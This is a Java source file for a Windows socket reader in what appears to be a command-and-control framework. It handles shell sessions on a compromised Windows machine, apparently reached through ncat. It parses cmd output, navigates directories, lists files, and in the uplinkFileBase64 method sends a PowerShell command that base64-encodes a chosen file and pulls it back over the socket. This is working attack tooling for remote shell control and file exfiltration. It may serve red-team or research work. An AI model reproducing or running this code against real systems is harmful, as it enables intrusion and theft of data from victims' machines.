package c2.tcp;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;

import c2.Constants;
import c2.session.IOManager;
import util.Time;

public class WindowsSocketReader extends SocketReader {

	private static final String WINDOWS_LINE_SEP = "\r\n";

	// This flag is set if the first line of the response is a echo of the command
	// which needs to be stripped
	private boolean removeEchoedCommand = true;

	public WindowsSocketReader(Socket socket, BufferedReader br) {
		super(socket, br, true);
		super.usesDollarSigns = false;
	}

	private String processSocketRead(String command) throws IOException {
		// System.out.println("Read: -" + command + "-");
		if (removeEchoedCommand) {
			String elements[] = command.split(WINDOWS_LINE_SEP);
			// Sometimes ncat and others will flush a string of chars to remind you where
			// you are
			// flush the buffer to get clean output
			if (isResponseAPromptFlush(elements)) {
				return "";
			}
			// ncat will echo a command immediately, but you might need to wait on the
			// response for the command.
			// with the command echo flushed, wait for the new IO to arrive
			if (elements.length == 1 && elements[0].length() != 0) {
				command = super.readUnknownLinesFromSocket();
				int retryCounter = 0;
				while (command.length() == 0 && retryCounter < Constants.getConstants().getMaxResponseWait()) {
					command = super.readUnknownLinesFromSocket();
					retryCounter += Constants.getConstants().getRepollForResponseInterval();
					Time.sleepWrapped(Constants.getConstants().getRepollForResponseInterval());
				}
				// System.out.println("Returning: -" +command +"-");
				command = stripTrailingPrompt(command);
				// System.out.println("ReturningStripped: -" +command +"-");
				return command;
			}
		}
		if (removeEchoedCommand && command != null && command.length() != 0) {
			int firstLineBreak = command.indexOf(WINDOWS_LINE_SEP);
			command = command.substring(firstLineBreak + WINDOWS_LINE_SEP.length());
		}
		// System.out.println("Returning: -" +command +"-");
		command = stripTrailingPrompt(command);
		// System.out.println("ReturningStripped: -" +command +"-");
		return command;
	}

	@Override
	public String readUnknownLinesFromSocketWithTimeout(long timeout) throws IOException {
		String command = super.readUnknownLinesFromSocketWithTimeout(timeout);
		command = processSocketRead(command);
		return command;
	}

	@Override
	public String readUnknownLinesFromSocket() throws IOException {
		String command = super.readUnknownLinesFromSocket();
		command = processSocketRead(command);
		return command;
	}

	private static boolean isResponseAPromptFlush(String response[]) {
		if (response.length == 1) {
			if (response[0].startsWith("C:\\") && response[0].endsWith(">")) {
				return true;
			}
		} else if (response.length == 2) {
			if ((response[0].equals("") && (response[1].startsWith("C:\\") && response[1].endsWith(">")))
					|| (response[1].equals("") && (response[0].startsWith("C:\\") && response[0].endsWith(">")))) {
				return true;
			}
		}
		return false;
	}

	private static String stripTrailingPrompt(String message) {
		String elements[] = message.split(WINDOWS_LINE_SEP);
		if (elements.length == 1 && message.length() == 0) {
			return message;
		}
		boolean dropLastLine = false;
		boolean dropPenultimateLine = false;
		boolean endsWithCarrot = elements[elements.length - 1].endsWith(">");
		if (!System.lineSeparator().equals(WINDOWS_LINE_SEP)) {
			endsWithCarrot = elements[elements.length - 1].endsWith(">" + System.lineSeparator());
		}
		if ((elements[elements.length - 1].startsWith("C:\\") && endsWithCarrot)) {
			dropLastLine = true;
			if (elements[elements.length - 2].equals("")) {
				dropPenultimateLine = true;
			}
		}
		StringBuilder sb = new StringBuilder();
		for (int idx = 0; idx < elements.length; idx++) {
			if (idx == elements.length - 1) {
				if (!dropLastLine) {
					sb.append(elements[idx]);
					sb.append(System.lineSeparator());
				}
			} else if (idx == elements.length - 2) {
				if (!dropPenultimateLine) {
					sb.append(elements[idx]);
					sb.append(System.lineSeparator());
				}
			} else {
				sb.append(elements[idx]);
				sb.append(System.lineSeparator());
			}
		}
		return sb.toString();
	}

	@Override
	public void executeCd(String cd, IOManager ioManager, OutputStreamWriter bw, int sessionId) throws IOException {
		bw.write(cd);
		bw.write(System.lineSeparator());
		bw.flush();
		String response = readUnknownLinesFromSocketWithTimeout(500);
		bw.write("echo %CD%");
		bw.write(System.lineSeparator());
		bw.flush();
		response = readUnknownLinesFromSocketWithTimeout(500);
		String lines[] = response.split(System.lineSeparator());
		ioManager.sendIO(sessionId, lines[0].concat(System.lineSeparator()));

	}

	@Override
	public String getCurrentDirectoryNativeFormat(IOManager ioManager, OutputStreamWriter bw, int sessionId)
			throws IOException {
		bw.write("dir");
		bw.write(System.lineSeparator());
		bw.flush();
		return readUnknownLinesFromSocketWithTimeout(500);
	}

	@Override
	public List<String> getCurrentDirectoriesFromNativeFormatDump(String parentDirectory, String dir) {
		List<String> directories = new ArrayList<>();
		String lines[] = dir.split(System.lineSeparator());
		String normalized = lines[5].replaceAll("\\s+", " ");
		String l5[] = normalized.split(" ");
		if (!l5[3].equals("<DIR>") || !l5[4].equals(".")) {
			throw new IllegalArgumentException("Invalid Windows directory dump given");
		}
		for (int idx = 7; idx < lines.length; idx++) {
			if (lines[idx].contains("Files(s)")) {
				break;
			}
			String elements[] = lines[idx].replaceAll("\\s+", " ").split(" ");
			if (elements[3].equals("<DIR>")) {
				directories.add(parentDirectory + "\\" + elements[4]);
			}
		}
		return directories;
	}

	@Override
	public List<String> getCurrentFilesFromNativeFormatDump(String parentDirectory, String dir) {
		List<String> directories = new ArrayList<>();
		String lines[] = dir.split(System.lineSeparator());
		String normalized = lines[5].replaceAll("\\s+", " ");
		String l5[] = normalized.split(" ");
		if (!l5[3].equals("<DIR>") || !l5[4].equals(".")) {
			throw new IllegalArgumentException("Invalid Windows directory dump given");
		}
		for (int idx = 7; idx < lines.length; idx++) {
			String elements[] = lines[idx].replaceAll("\\s+", " ").split(" ");
			if (elements[2].startsWith("File")) {
				break;
			}
			if (!elements[3].equals("<DIR>")) {
				directories.add(parentDirectory + "\\" + elements[4]);
			}
		}
		return directories;
	}

	@Override
	public String uplinkFileBase64(String filename, OutputStreamWriter bw, int sessionId) throws Exception {
		String uplinkCommand = "powershell -c \"[Convert]::ToBase64String((Get-Content -Path '" + filename
				+ "' -Encoding Byte))\"";
		bw.write(uplinkCommand);
		bw.write(System.lineSeparator());
		bw.flush();
		String response = readUnknownLinesFromSocketWithTimeout(2500);
		// System.out.println("Read: " + response.length());
		String lines[] = response.split(System.lineSeparator());
		if (lines.length != 0 && !response.contains("Get-Content : Cannot find path")) {
			return lines[0];
		} else {
			throw new Exception("Invalid file name");
		}
	}

	@Override
	public String getPwd(OutputStreamWriter bw, int sessionId) {
		try {
			bw.write("echo %CD%");
			bw.write(System.lineSeparator());
			bw.flush();
			String response = readUnknownLinesFromSocketWithTimeout(1000);
			String lines[] = response.split(System.lineSeparator());
			return lines[0];
		} catch (Exception ex) {
			return "Unable to query current working directory";
		}
	}
}
